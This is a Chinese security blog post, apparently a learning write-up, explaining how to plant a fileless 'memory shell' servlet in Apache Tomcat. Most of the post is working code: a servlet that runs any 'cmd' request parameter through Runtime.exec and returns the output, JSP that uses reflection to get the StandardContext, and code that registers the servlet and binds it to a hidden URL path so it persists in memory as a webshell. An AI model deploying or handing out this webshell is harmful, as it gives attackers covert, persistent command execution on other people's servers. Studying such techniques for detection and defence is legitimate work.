@@ -1,0 +1,315 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Servlet Memory Shell | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Servlet Memory Shell | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前言
+前面学习完了Filter内存马，现在来学习Servlet内存马，其实两者本质上区别并不大，如果学习过之前的Filter内存马，学习这个Servlet内存马其实是类似的。
+正文
+这里为了方便师傅们理解，我随便写了个demo
+TestSe..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Servlet Memory Shell
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-16
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前言">前言</h1>
+<p>前面学习完了Filter内存马，现在来学习Servlet内存马，其实两者本质上区别并不大，如果学习过之前的Filter内存马，学习这个Servlet内存马其实是类似的。</p>
+<h1 id="正文">正文</h1>
+<p>这里为了方便师傅们理解，我随便写了个demo</p>
+<p>TestServlet.java</p>
+<pre><code class="language-java">import javax.servlet.*;
+import javax.servlet.annotation.WebServlet;
+import java.io.IOException;
+
+public class TestServlet implements Servlet {
+    @Override
+    public void init(ServletConfig servletConfig) throws ServletException {
+
+    }
+    @Override
+    public ServletConfig getServletConfig() {
+        return null;
+    }
+    @Override
+    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
+        Runtime.getRuntime().exec(servletRequest.getParameter(&quot;cmd&quot;));
+    }
+    @Override
+    public String getServletInfo() {
+        return null;
+    }
+    @Override
+    public void destroy() {
+
+    }
+}
+</code></pre>
+<p>web.xml</p>
+<pre><code class="language-xml">&lt;!DOCTYPE web-app PUBLIC
+ &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;
+ &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;
+
+&lt;web-app&gt;
+  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;
+
+  &lt;servlet&gt;
+    &lt;servlet-name&gt;TestServlet&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;TestServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;TestServlet&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+&lt;/web-app&gt;
+</code></pre>
+<p>访问即可造成命令执行</p>
+<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174243903.png" alt="image-20220411174243903" loading="lazy"></figure>
+<p>这里的话是设计到了Java Web中的Servlet，熟悉Java开发的师傅应该知道，Servlet会绑定一个url，如果用户对指定的url发起请求，这个请求会先经过Listener，然后经过Filter，最后到Servlet，那么我们如果此时有这么一个恶意的Servlet，并且绑定了指定了路径，那么是不是可以实现无文件getshell呢？(这里的话可以了解一下Servlet的生命周期)</p>
+<blockquote>
+<p>Servlet 的生命周期开始于Web容器的启动时，它就会被载入到Web容器内存中，直到Web容器停止运行或者重新装入servlet时候结束。这里也就是说明，一旦Servlet被装入到Web容器之后，一般是会长久驻留在Web容器之中。</p>
+</blockquote>
+<p>因此此时我们的目标还是需要想办法写入一个恶意的Servlet并且去注册这个Servlet，所以我们需要找到Servlet的信息是从哪里获取，这里对TestServlet的service方法下个断点进行调试</p>
+<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174249576.png" alt="image-20220411174249576" loading="lazy"></figure>
+<p>我们继续往前走，找到获取Servlet的位置，可以发现，在ApplicationFilterChain的internalDoFilter方法中，存在如下代码</p>
+<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174252936.png" alt="image-20220411174252936" loading="lazy"></figure>
+<p><code>servlet.service(request, response);</code>去调用了servlet的service方法，此时的servlet就是我们的TestServlet，那么我们继续往回走，看看servlet是从哪里进行赋值。不过这里也不用这么麻烦了，经过Filter内存马的学习，我们大概可以了解Engine，Host，Context，Wrapper之间的关系，Context 负责管理 Wapper ，而 Wapper 又负责管理 Servlet 实例，因此我们可以直接去查看添加一个servlet后StandardContext的变化<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174257096.png" alt="image-20220411174257096" loading="lazy"></p>
+<p>servlet被添加到了children中，对应的是使用StandardWrapper这个类进行封装，其中有servlet的名字跟对应的类。StandardWrapper对应配置文件中的如下节点：</p>
+<pre><code class="language-xml">&lt;servlet&gt;
+  &lt;servlet-name&gt;TestServlet&lt;/servlet-name&gt;
+  &lt;servlet-class&gt;TestServlet&lt;/servlet-class&gt;
+&lt;/servlet&gt;
+</code></pre>
+<p>servlet也有servletMappings，记录了urlParttern跟所对应的servlet的关系standardContext.servletMappings</p>
+<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174304202.png" alt="image-20220411174304202" loading="lazy"></figure>
+<p>对应web.xml中的如下节点</p>
+<pre><code class="language-xml">&lt;servlet-mapping&gt;
+  &lt;servlet-name&gt;TestServlet&lt;/servlet-name&gt;
+  &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
+&lt;/servlet-mapping&gt;
+</code></pre>
+<p>因此我们如果要使用Servlet内存马的话思路比较清晰</p>
+<ol>
+<li>构造一个恶意的Servlet</li>
+<li>获取到StandardContext</li>
+<li>用Wrapper对其进行封装</li>
+<li>添加Wrapper到children中</li>
+<li>绑定对应的路径和恶意的Servlet</li>
+</ol>
+<p>首先先构造一个恶意的Servlet</p>
+<pre><code class="language-jsp">&lt;%!
+    Servlet servlet = new Servlet() {
+        @Override
+        public void init(ServletConfig servletConfig) throws ServletException {
+
+        }
+        @Override
+        public ServletConfig getServletConfig() {
+            return null;
+        }
+        @Override
+        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
+            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
+            InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
+            Scanner s = new Scanner(in).useDelimiter(&quot;\\a&quot;);
+            String output = s.hasNext() ? s.next() : &quot;&quot;;
+            PrintWriter out = servletResponse.getWriter();
+            out.println(output);
+            out.flush();
+            out.close();
+        }
+        @Override
+        public String getServletInfo() {
+            return null;
+        }
+        @Override
+        public void destroy() {
+
+        }
+    };
+%&gt;
+</code></pre>
+<p>然后获取到StandardContext，这里可以直接通过request获取</p>
+<pre><code class="language-jsp">&lt;%
+    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
+    reqF.setAccessible(true);
+    Request req = (Request) reqF.get(request);
+    StandardContext stdcontext = (StandardContext) req.getContext();
+%&gt;
+</code></pre>
+<p>之后就是用Wrapper对其进行封装，这里的loadonstartup是代表servlet的优先级，正数越小，优先级越高</p>
+<pre><code class="language-java">&lt;%
+    Wrapper newWrapper = stdcontext.createWrapper();
+    String name = servlet.getClass().getSimpleName();
+    newWrapper.setName(name);
+    newWrapper.setLoadOnStartup(1);
+    newWrapper.setServlet(servlet);
+    newWrapper.setServletClass(servlet.getClass().getName());
+%&gt;
+</code></pre>
+<p>最后进行url绑定</p>
+<pre><code class="language-jsp">&lt;%
+    stdcontext.addChild(newWrapper);
+    stdcontext.addServletMapping(&quot;/ch1e&quot;, name);
+%&gt;
+</code></pre>
+<p>运行以后需要先访问一下shell.jsp，把我们的Servlet进行注册，然后即可GET:/ch1e?cmd=calc</p>
+<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174309668.png" alt="image-20220411174309668" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E6%AD%A3%E6%96%87">正文</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/rome-fan-xu-lie-hua-lian/">
+              <h3 class="post-title">
+                Rome反序列化链
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
